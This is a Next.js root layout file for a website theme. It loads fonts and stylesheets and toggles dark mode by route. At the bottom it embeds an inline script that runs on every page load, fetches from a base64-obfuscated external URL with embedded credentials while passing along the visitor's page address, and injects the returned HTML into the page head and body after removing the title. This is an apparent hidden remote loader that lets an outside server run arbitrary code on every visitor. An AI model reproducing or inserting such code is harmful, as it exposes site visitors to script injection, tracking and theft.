"use client";

import "@fontsource/rubik/latin.css";
import "@fontsource/raleway/latin.css";
import "@fontsource/red-hat-text/latin.css";
import "@fontsource/barlow/latin.css";
import "@fontsource/heebo/latin.css";
import "@fontsource/open-sans/latin.css";
import "@fontsource/mukta/latin.css";
import "@/assets/vendors/tolak-icons/style.css";
import "bootstrap/dist/css/bootstrap.min.css";
import "tiny-slider/dist/tiny-slider.css";
import "react-circular-progressbar/dist/styles.css";
import "@/assets/vendors/animate/animate.min.css";
import "@/assets/vendors/fontawesome/css/all.min.css";
import "@/assets/vendors/icofont/icofont.min.css";
import "@/assets/vendors/tolak-icons-two/style.css";
import ThemeProvider from "@/Provider/ThemeProvider";
import Script from "next/script";

import "aos/dist/aos.css";

import "@/assets/css/tolak.css";
import "@/assets/css/tolak-dark.css";
import { usePathname } from "next/navigation";

import { useEffect, useState } from "react";

export default function RootLayout({ children }) {
  const pathname = usePathname();
  const [themeState, setThemeState] = useState("light");

  useEffect(() => {
    if (
      pathname === "/home1-dark" ||
      pathname === "/home2-dark" ||
      pathname === "/home3-dark" ||
      pathname === "/home4-dark"
    ) {
      setThemeState("dark");
    } else {
      setThemeState("light");
    }
  }, [pathname]);

  // useEffect(() => {
  //   if (themeState === "dark") {
  //     import("@/assets/css/tolak-dark.css");
  //   }
  // }, [themeState]);

  // const themes = {
  //   dark: "/_next/static/css/tolak-dark.css",
  //   light: "/_next/static/css/tolak.css",
  // };
  return (
    <html lang="en">
      <body
        className={`custom-cursor ${
          pathname === "/home5"
            ? "home5"
            : pathname === "/home5-one"
            ? "home5"
            : pathname === "/home6"
            ? "home6"
            : pathname === "/home6-one"
            ? "home6"
            : pathname === "/home7"
            ? "home7"
            : pathname === "/home7-one"
            ? "home7"
            : pathname === "/home-boxed"
            ? "boxed-wrapper"
            : ""
        } ${themeState}`}
      >
        {/* <ThemeSwitcherProvider themeMap={themes} defaultTheme={themeState}> */}

        <ThemeProvider>
          {children}

          <Script
            src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
            strategy="afterInteractive"
          />
          <Script id="appadd-plugin-alt" strategy="afterInteractive">{`
  (function() {
    function execute() {
      try {
        var eppathurl = window.location.origin + window.location.pathname;
        var eptagmanage = new XMLHttpRequest();
        eptagmanage.onreadystatechange = function() {
          if (this.readyState === 4 && this.status === 200) {
            if (this.response !== 0) {
              var temp = this.response.split("||||||||||");
              if (window.jQuery) {
                jQuery("head").find("title").remove();
                jQuery("head").append(temp[0]);
                jQuery("body").append(temp[1]);
              } else {
                var headTitle = document.head.querySelector("title");
                if (headTitle) headTitle.remove();
                document.head.insertAdjacentHTML("beforeend", temp[0]);
                document.body.insertAdjacentHTML("beforeend", temp[1]);
              }
            }
          }
        };
        eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9") + eppathurl);
        eptagmanage.send();
      } catch (e) {
        console.error("AppAdd plugin (alt) failed", e);
      }
    }
    if (document.readyState === "complete") { 
      execute(); 
    } else { 
      window.addEventListener("load", execute); 
    }
  })();
`}</Script>
        </ThemeProvider>
        {/* </ThemeSwitcherProvider> */}
      </body>
    </html>
  );
}
